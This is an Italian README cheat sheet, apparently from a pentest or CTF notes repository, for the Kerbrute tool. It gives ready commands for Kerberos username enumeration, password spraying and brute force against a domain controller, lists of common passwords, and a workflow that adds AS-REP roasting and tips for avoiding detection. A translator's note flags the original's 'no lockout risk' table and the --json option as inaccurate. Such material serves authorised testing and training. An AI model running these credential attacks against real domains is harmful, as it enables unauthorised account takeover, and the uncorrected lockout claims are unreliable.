# 🔑 Kerbrute - Enumerazione degli utenti Kerberos

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Strumento di brute force sulla preautenticazione Kerberos
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

> **Correzione importante:** la semplice enumerazione senza preautenticazione è distinta dai tentativi di password. Password spraying e brute force possono incrementare i contatori degli accessi falliti e bloccare gli account; la promessa generale “nessun rischio di blocco” e la tabella iniziale sono inesatte se applicate a tutte le modalità. Un ritardo non garantisce assenza di blocchi o log. `--delay` impone un singolo thread secondo la documentazione consultata; `--json` non compare nell’aiuto ufficiale riportato. Date, opzioni ed esempi sono conservati come nell’originale, senza verificarne l’effetto su un dominio. Vedi il [progetto ufficiale Kerbrute](https://github.com/ropnop/kerbrute).

---

## 📋 Indice

- [Che cos'è Kerbrute](#-che-cosè-kerbrute)
- [Installazione](#-installazione)
- [Enumerazione degli utenti](#-enumerazione-degli-utenti)
- [Password spraying](#-password-spraying)
- [Brute force](#-brute-force)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🎯 Che cos'è Kerbrute

**Kerbrute** sfrutta la preautenticazione Kerberos per enumerare gli utenti e provare password su più account (password spraying):

- 🔍 **Enumerazione degli utenti** - Trova nomi utente validi senza credenziali!
- 🔐 **Password spraying** - Prova una password su molti utenti
- 💥 **Brute force** - Verifica completa delle credenziali
- 🚫 **Nessun rischio di blocco** - Gli errori di preautenticazione non attivano il blocco degli account (affermazione dell'originale: vedi nota)

### Perché Kerbrute?

| Metodo | Attiva il blocco dell'account | Log generati |
|--------|------------------|----------------|
| Bind LDAP | Sì | Sì |
| Autenticazione SMB | Sì | Sì |
| **Preautenticazione Kerberos** | **No** | Minimi |

---

## 🚀 Installazione

### Scarica il binario

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

### Da sorgente

```bash
go install github.com/ropnop/kerbrute@latest
```

### Verifica

```bash
kerbrute --help
```

---

## 🔍 Enumerazione degli utenti

### Utilizzo di base

```bash
# Enumera gli utenti da una wordlist
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# Con il nome host del controller di dominio
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

### Opzioni di output

```bash
# Output dettagliato
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Salva l'output in un file
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# Output JSON
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

### Gestione dei thread

```bash
# Aumenta i thread (predefiniti: 10)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# Gestione prudente dei thread
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

### Esempio di output

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

## 🔐 Password spraying

### Spraying di base

```bash
# Una sola password contro un elenco di utenti
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# Da file
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

### Più password

```bash
# Prova più password (una alla volta!)
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # Attendi 5 minuti tra i cicli di spraying
done
```

### Output

```bash
# Mostra le credenziali valide
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

### Esempio di output

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

### Spraying prudente

```bash
# Verifica prima i criteri delle password!
crackmapexec ldap DC01 -u user -p pass --password-policy

# Pochi tentativi e intervalli lunghi
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

## 💥 Brute force

### Brute force completo

```bash
# Prova tutte le combinazioni username:password
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

### Elenco combinato

```bash
# Usa il formato username:password
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# Formato di creds.txt:
# admin:Password1
# john:Summer2024
```

---

## 📊 Riferimento rapido

### Comandi

| Comando | Descrizione |
|---------|-------------|
| `userenum` | Enumera i nomi utente validi |
| `passwordspray` | Prova una password sugli utenti |
| `bruteuser` | Brute force di un singolo utente |
| `bruteforce` | Prova combinazioni user:pass |

### Opzioni essenziali

| Opzione | Descrizione |
|--------|-------------|
| `-d` | Nome del dominio |
| `--dc` | IP/nome host del controller di dominio |
| `-t` | Thread (predefiniti: 10) |
| `-o` | File di output |
| `-v` | Output dettagliato |
| `--delay` | Ritardo tra i tentativi (ms) |

### Enumerazione degli utenti

```bash
# Di base
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# Con output
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# Veloce
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

### Password spraying

```bash
# Spraying di base
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# Spraying prudente
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

### Wordlist per l'enumerazione degli utenti

```bash
# Nomi comuni
/usr/share/seclists/Usernames/Names/names.txt

# Nomi utente più frequenti
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Formato personalizzato
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

### Password comuni

```
Stagione+Anno: Summer2024!, Winter2024!, Fall2024!
Azienda+Numero: CompanyName123!, Company2024!
Generiche: Password1, Welcome1, P@ssw0rd
```

---

## 🎯 Consigli per le CTF

1. **Enumera sempre prima** - Ottieni nomi utente senza credenziali!
2. **Verifica AS-REP** - Dopo aver trovato gli utenti, controlla l'assenza di preautenticazione
3. **Esegui lo spraying con cautela** - Una password, poi attendi
4. **Verifica i criteri** - Conosci la soglia di blocco degli account
5. **Usa un ritardo** - Riduci la possibilità di rilevamento

### Procedura

```bash
# 1. Enumera gli utenti
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. Verifica gli account esposti all'AS-REP roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. Esegui il password spraying
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

## 📚 Risorse

- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [Blog di ropnop](https://blog.ropnop.com/)

### Schede correlate
- [Metodologia AD](../../AD-Attack-Methodology/translations/README.it.md)
- [Rubeus](../../Rubeus/translations/README.it.md)
- [CrackMapExec](../../CrackMapExec/translations/README.it.md)

---

<p align="center">
  <b>🔑 Enumera gli utenti e prova le password!</b><br>
  <i>Kerbrute - Un accesso meno evidente</i>
</p>
